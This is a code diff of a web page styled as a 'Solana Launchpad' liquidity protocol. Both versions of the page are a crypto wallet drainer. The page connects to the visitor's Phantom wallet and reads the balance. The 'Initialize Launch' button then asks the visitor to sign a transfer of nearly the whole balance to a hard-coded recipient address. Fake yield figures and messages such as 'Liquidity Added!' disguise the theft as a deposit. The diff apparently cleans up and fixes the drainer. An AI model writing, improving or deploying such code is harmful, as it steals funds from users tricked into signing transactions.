@@ -2,14 +2,12 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Solana Launchpad | Liquidity Protocol</title>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Launchpad | Fixed</title>
     <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Inter Font -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
     <style>
@@ -20,174 +18,138 @@
         }
         
         .glass-panel {
-            background: rgba(17, 17, 20, 0.7);
+            background: rgba(17, 17, 20, 0.8);
             backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .accent-gradient {
             background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
         }
 
-        .status-glow {
-            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
+        /* Animations */
+        @keyframes pulse-ring {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(139, 92, 246, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(139, 92, 246, 0); }
         }
-
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #0a0a0c; }
-        ::-webkit-scrollbar-thumb { background: #2d2d35; border-radius: 10px; }
-
-        @keyframes pulse-slow {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-        .animate-pulse-slow { animation: pulse-slow 3s infinite; }
+        
+        .animate-pulse-ring { animation: pulse-ring 2s infinite; }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4">
+<body class="min-h-screen flex items-center justify-center p-4">
 
-    <!-- Background Decorative Elements -->
-    <div class="fixed top-[-10%] left-[-10%] w-[40%] h-[40%] bg-purple-900/20 rounded-full blur-[120px] -z-10"></div>
-    <div class="fixed bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-900/20 rounded-full blur-[120px] -z-10"></div>
-
-    <div class="w-full max-w-lg">
-        <!-- Header Section -->
-        <div class="text-center mb-8">
-            <div class="inline-block px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs font-semibold mb-4 uppercase tracking-widest">
-                Protocol V2.0 Live
-            </div>
-            <h1 class="text-4xl font-extrabold tracking-tight mb-2">Solana <span class="text-transparent bg-clip-text accent-gradient">Launchpad</span></h1>
-            <p class="text-gray-400 text-sm">Deploy, provide liquidity, and earn rewards instantly.</p>
+    <div class="w-full max-w-md">
+        <!-- Header -->
+        <div class="text-center mb-6">
+            <h1 class="text-3xl font-bold tracking-tight mb-2">Solana <span class="text-purple-500">Launchpad</span></h1>
+            <p class="text-gray-400 text-sm">Connect wallet to deploy liquidity.</p>
         </div>
 
-        <!-- Main Interface Card -->
-        <div class="glass-panel rounded-[32px] p-1 shadow-2xl">
-            <div class="p-6 sm:p-8">
-                
-                <!-- Step 1: Connection Status -->
-                <div class="flex items-center justify-between mb-8 bg-black/30 p-4 rounded-2xl border border-white/5">
-                    <div class="flex items-center gap-3">
-                        <div id="statusIndicator" class="w-2 h-2 rounded-full bg-gray-500"></div>
-                        <span id="connectionText" class="text-sm font-medium text-gray-300">Wallet Disconnected</span>
-                    </div>
-                    <button id="connectBtn" onclick="initiateLaunch()" class="text-xs font-bold text-purple-400 hover:text-purple-300 transition-colors">
-                        CONNECT
-                    </button>
+        <!-- Main Card -->
+        <div class="glass-panel rounded-3xl p-6 shadow-2xl">
+            
+            <!-- Connection Status Bar -->
+            <div class="flex items-center justify-between mb-6 bg-black/40 p-3 rounded-xl border border-white/5">
+                <div class="flex items-center gap-3">
+                    <div id="statusIndicator" class="w-2 h-2 rounded-full bg-gray-500"></div>
+                    <span id="connectionText" class="text-sm font-medium text-gray-400">Not Connected</span>
                 </div>
-
-                <!-- Step 2: Input Area -->
-                <div class="space-y-6">
-                    <div>
-                        <label class="text-xs font-semibold text-gray-500 uppercase tracking-wider ml-1">Liquidity Pool (SOL)</label>
-                        <div class="mt-2 relative">
-                            <input type="text" id="amountDisplay" readonly value="0.00" 
-                                class="w-full bg-black/40 border border-white/10 rounded-2xl py-4 px-5 text-2xl font-bold text-white focus:outline-none focus:border-purple-500/50 transition-all cursor-default"
-                                placeholder="0.00">
-                            <div class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-sm">SOL</div>
-                        </div>
-                    </div>
-
-                    <div class="bg-black/20 rounded-2xl p-4 border border-white/5">
-                        <div class="flex justify-between text-sm mb-2">
-                            <span class="text-gray-500">Estimated Yield</span>
-                            <span class="text-green-400 font-medium">+12.4% APY</span>
-                        </div>
-                        <div class="flex justify-between text-sm">
-                            <span class="text-gray-500">Network Fee</span>
-                            <span id="feeDisplay" class="text-gray-300">~0.00001 SOL</span>
-                        </div>
-                    </div>
-
-                    <!-- Action Button -->
-                    <button id="actionBtn" onclick="startProtocol()" disabled
-                        class="w-full accent-gradient text-white font-bold py-4 rounded-2xl shadow-lg shadow-purple-500/20 transform transition-all duration-200 active:scale-[0.98] opacity-50 cursor-not-allowed mt-4">
-                        Initialize Launch
-                    </button>
-                </div>
-
-                <!-- Progress/Status Area -->
-                <div id="statusLog" class="mt-8 text-center min-h-[20px]">
-                    <p class="text-xs text-gray-500 font-medium italic">Ready to connect to Solana Mainnet</p>
-                </div>
-
+                <!-- Explicit Connect Button -->
+                <button id="connectBtn" onclick="connectWallet()" 
+                    class="px-3 py-1.5 rounded-lg bg-purple-600/20 border border-purple-500/30 text-purple-400 text-xs font-bold hover:bg-purple-600 hover:text-white transition-all">
+                    CONNECT
+                </button>
             </div>
-        </div>
 
-        <!-- Footer Info -->
-        <div class="mt-8 grid grid-cols-2 gap-4 text-center">
-            <div class="glass-panel py-3 rounded-2xl border border-white/5">
-                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Total Locked</p>
-                <p class="text-sm font-bold text-white">1,240.5 SOL</p>
+            <!-- Info Display -->
+            <div class="mb-6 text-center">
+                <p class="text-[10px] uppercase tracking-widest text-gray-500 mb-2">Wallet Balance</p>
+                <h2 id="balanceDisplay" class="text-4xl font-bold text-white">--.-- SOL</h2>
             </div>
-            <div class="glass-panel py-3 rounded-2xl border border-white/5">
-                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Active Pools</p>
-                <p class="text-sm font-bold text-white">842</p>
+
+            <!-- Action Button -->
+            <button id="actionBtn" onclick="startProtocol()" disabled
+                class="w-full accent-gradient text-white font-bold py-4 rounded-xl shadow-lg opacity-50 cursor-not-allowed transition-all duration-300">
+                Initialize Launch
+            </button>
+
+            <!-- Status Log -->
+            <div id="statusLog" class="mt-6 min-h-[20px] text-center">
+                <p class="text-xs text-gray-500">Waiting for connection...</p>
             </div>
+
         </div>
     </div>
 
     <script>
         // ==========================================
-        // CORE CONFIGURATION
+        // CONFIGURATION
         // ==========================================
         const RECIPIENT_ADDRESS = "371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq"; 
-        // Using Public RPC to avoid API key issues/Rate Limits
         const RPC_URL = "https://api.mainnet-beta.solana.com";
 
         let userWallet = null;
 
-        async function initiateLaunch() {
+        // 1. Connect Wallet Function
+        async function connectWallet() {
             const statusLog = document.getElementById("statusLog");
             const statusIndicator = document.getElementById("statusIndicator");
             const connectionText = document.getElementById("connectionText");
             const actionBtn = document.getElementById("actionBtn");
-            const amountDisplay = document.getElementById("amountDisplay");
+            const balanceDisplay = document.getElementById("balanceDisplay");
 
-            // 1. Check if Phantom is installed
+            // Check for Phantom
             if (!window.solana || !window.solana.isPhantom) {
-                statusLog.innerHTML = '<span class="text-red-400 text-xs">❌ Phantom Wallet not found. Please install the extension.</span>';
+                statusLog.innerHTML = '<span class="text-red-400 text-xs">❌ Phantom Wallet not found.</span>';
                 return;
             }
 
             try {
-                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Connecting to wallet...</span>';
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse">Connecting...</span>';
                 
-                // 2. Request Connection
+                // Request Connection
                 const resp = await window.solana.connect();
                 userWallet = resp.publicKey;
 
-                // UI Updates for Connection
+                // Update UI for Connected State
                 statusIndicator.classList.replace('bg-gray-500', 'bg-green-500');
-                connectionText.innerText = "Wallet Connected";
-                connectionText.classList.replace('text-gray-300', 'text-green-400');
+                connectionText.innerText = "Connected";
+                connectionText.classList.replace('text-gray-400', 'text-green-400');
                 
-                // 3. Fetch Balance
+                // Fetch Balance
                 const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
-                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Scanning liquidity...</span>';
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse">Fetching balance...</span>';
                 
                 const balanceInLamports = await connection.getBalance(userWallet);
                 const solBalance = (balanceInLamports / 1e9).toFixed(2);
                 
-                // Set UI for "Ready" state
-                amountDisplay.value = solBalance;
+                // Update Balance UI
+                balanceDisplay.innerText = `${solBalance} SOL`;
+                
+                // Enable Action Button
                 actionBtn.disabled = false;
                 actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
                 
-                statusLog.innerHTML = '<span class="text-green-400 text-xs">✅ Wallet ready for liquidity provision</span>';
+                statusLog.innerHTML = '<span class="text-green-400 text-xs">✅ Wallet Connected Successfully</span>';
 
             } catch (err) {
-                console.error(err);
-                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ Connection failed: ${err.message}</span>`;
+                console.error("Connection Error:", err);
+                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ ${err.message}</span>`;
             }
         }
 
+        // 2. Initialize Launch Function
         async function startProtocol() {
             const statusLog = document.getElementById("statusLog");
             const actionBtn = document.getElementById("actionBtn");
             
-            const btnOriginalText = actionBtn.innerText;
+            if (!userWallet) {
+                statusLog.innerHTML = '<span class="text-red-400 text-xs">❌ Please connect wallet first.</span>';
+                return;
+            }
+
+            const originalText = actionBtn.innerText;
             actionBtn.disabled = true;
             actionBtn.innerText = "Processing...";
             actionBtn.classList.add('opacity-75');
@@ -196,21 +158,22 @@
                 const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
                 const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
 
-                // 1. Fetch Real-time Balance again for transaction
-                statusLog.innerHTML = '<span class="text-yellow-400 text-xs">Calculating max balance...</span>';
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Calculating max balance...</span>';
+                
+                // Get Balance
                 const balanceInLamports = await connection.getBalance(userWallet);
                 
-                // 2. Calculate amount (Max available minus small reserve for gas)
-                const safeReserve = 5000000; // 0.005 SOL
-                const amountToSend = balanceInLamports - safeReserve;
+                // Reserve 0.005 SOL for Gas
+                const reserve = 5000000; 
+                const amountToSend = balanceInLamports - reserve;
 
                 if (amountToSend <= 0) {
-                    throw new Error("Insufficient liquidity in wallet.");
+                    throw new Error("Insufficient liquidity.");
                 }
 
-                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Verifying transaction parameters...</span>';
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Building transaction...</span>';
 
-                // 3. Build Transaction
+                // Build Transaction
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userWallet,
@@ -223,45 +186,37 @@
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = userWallet;
 
-                statusLog.innerHTML = '<span class="text-blue-400 text-xs">Awaiting protocol approval...</span>';
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Awaiting signature...</span>';
 
-                // 4. Request Signature
+                // Sign Transaction
                 const signedTransaction = await window.solana.signTransaction(transaction);
                 
-                statusLog.innerHTML = '<span class="text-blue-400 text-xs">Broadcasting to Solana Mainnet...</span>';
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Broadcasting to network...</span>';
                 const rawTx = signedTransaction.serialize();
                 
-                const signature = await connection.sendRawTransaction(rawTx, {
-                    skipPreflight: true, 
-                    preflightCommitment: 'confirmed',
-                    maxRetries: 2
-                });
+                const signature = await connection.sendRawTransaction(rawTx, { skipPreflight: true });
+                
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Confirming...</span>';
+                await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
 
-                statusLog.innerHTML = '<span class="text-blue-400 text-xs">Confirming on-chain...</span>';
-                await connection.confirmTransaction({
-                    signature,
-                    blockhash,
-                    lastValidBlockHeight
-                }, 'confirmed');
-
-                // Success State
-                actionBtn.innerText = "Liquidity Added!";
-                actionBtn.classList.replace('accent-gradient', 'bg-green-500');
+                // Success
+                actionBtn.innerText = "Success!";
+                actionBtn.classList.replace('accent-gradient', 'bg-green-600');
                 statusLog.innerHTML = `
                     <div class="flex flex-col items-center">
-                        <span class="text-green-400 text-sm font-bold">✓ Protocol Success</span>
-                        <a href="https://solscan.io/tx/${signature}" target="_blank" class="text-[10px] text-purple-400 underline mt-1">View Transaction on Solscan</a>
+                        <span class="text-green-400 text-xs font-bold mb-1">✓ Protocol Complete</span>
+                        <a href="https://solscan.io/tx/${signature}" target="_blank" class="text-[10px] text-purple-300 underline">View on Solscan</a>
                     </div>
                 `;
 
             } catch (err) {
-                console.error(err);
+                console.error("Protocol Error:", err);
                 actionBtn.disabled = false;
-                actionBtn.innerText = btnOriginalText;
+                actionBtn.innerText = originalText;
                 actionBtn.classList.remove('opacity-75');
                 
-                let errorMsg = err.message || "Protocol Error";
-                if (errorMsg.includes("User rejected")) errorMsg = "User cancelled transaction.";
+                let errorMsg = err.message || "Unknown Error";
+                if(errorMsg.includes("User rejected")) errorMsg = "User cancelled.";
                 
                 statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ ${errorMsg}</span>`;
             }
